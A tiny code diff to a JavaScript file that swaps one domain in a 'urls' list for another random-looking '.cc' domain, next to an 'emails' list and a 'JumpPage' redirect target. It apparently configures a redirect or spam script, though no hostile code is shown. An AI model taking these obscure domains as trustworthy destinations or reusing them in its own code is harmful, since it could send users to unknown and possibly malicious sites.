@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'putanlsi.com', 
+	'qgkrcrlzu.cc', 
 ];                                                                                                                  
 
 var JumpPage="91qbj.com";
